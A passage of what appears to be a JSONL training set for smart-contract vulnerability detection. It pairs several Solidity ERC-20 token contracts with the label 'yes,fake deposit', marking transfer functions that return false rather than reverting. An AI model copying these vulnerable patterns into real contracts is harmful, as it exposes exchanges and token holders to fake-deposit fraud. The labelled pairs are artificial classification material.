allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n//call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn\u2019t have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.16;\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 810000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 810000000; // Update total supply (100000 for example)\n name = \"Drone\"; // Set the name for display purposes\n decimals = 6; // Amount of decimals for display purposes\n symbol = \"DRONE\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.16;\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'v1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n address owner;\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000000; \n totalSupply = 100000000000; \n name = \"NFT Marketplace DCART\"; \n decimals = 4; \n symbol = \"DCART\"; \n owner = msg.sender;\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Keiko_Inu is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Keiko Inu\";\n string public constant symbol = \"KEIKO\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000000000;\t// Give the creator all initial tokens (100000 for example)\n totalSupply = 10000000000000000000;\t\t// Update total supply (100000 for example)\n name = \"VISA\";\t\t\t\t\t// Set the name for display purposes\n decimals = 10;\t\t\t\t\t// Amount of decimals for display purposes\n symbol = \"VISA\";\t\t\t\t// Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Coin {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardCoin is Coin {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract BeautyCoin is StandardCoin {\n\n function () {\n //if ether is sent to this address, send it back.\n \n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H0.1'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function BeautyCoin(\n ) {\n balances[msg.sender] = 12000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 12000000000000000000; // Update total supply (100000 for example)\n name = \"BeautyCoin\"; // Set the name for display purposes\n decimals = 12; // Amount of decimals for display purposes\n symbol = \"BCN\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() public constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) public constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) public returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) public returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract BeastToken is StandardToken {\n\n function () public {\n revert();\n }\n\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n\n constructor() public {\n balances[msg.sender] = 1000000000000000000000000;\n totalSupply = 1000000000000000000000000;\n name = \"Beast Token\";\n decimals = 18;\n symbol = \"BEAST\";\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract EthereumIceCream is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Ethereum Ice Cream\";\n string public constant symbol = \"ETHICE \ud83c\udf68\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.7.0 <0.8.0;\n\ncontract ERC20Interface {\n \n /// @return supply total amount of tokens\n function totalSupply() public virtual view returns (uint256 supply) {}\n\n /// @param tokenOwner The address from which the balance will be retrieved\n /// @return balance The balance\n function balanceOf(address tokenOwner) public virtual view returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return success Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) public virtual returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return success Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) public virtual returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return success Whether the approval was successful or not\n function approve(address _spender, uint256 _value) public virtual returns (bool success) {}\n\n /// @param tokenOwner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return remaining Amount of remaining tokens allowed to spent\n function allowance(address tokenOwner, address _spender) public virtual view returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\ncontract StandardToken is ERC20Interface {\n uint256 public _totalSupply;\n \n mapping (address => uint256) balances;\n //[tokenOwner][spender] = value\n //tokenOwner allows the spender to spend *value* of tokenOwner money\n mapping (address => mapping (address => uint256)) allowed;\n \n function transfer(address _to, uint256 _value) public override returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address tokenOwner) public view override returns (uint256 balance) {\n return balances[tokenOwner];\n }\n\n function approve(address _spender, uint256 _value) public override returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address tokenOwner, address _spender) public view override returns (uint256 remaining) {\n return allowed[tokenOwner][_spender];\n }\n \n function totalSupply() public view override returns (uint) {\n return _totalSupply - balances[address(0)];\n }\n\n}\n\ncontract MobiToken is StandardToken {\n\n \n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n\n constructor() {\n _totalSupply = 410000000; // Update total supply\n balances[msg.sender] = _totalSupply; // Give the creator all initial tokens\n name = \"Mobi Coin\"; // Set the name for display purposes\n decimals = 2; // Amount of decimals for display purposes\n symbol = \"MOBI\"; // Set the symbol for display purposes\n }\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function 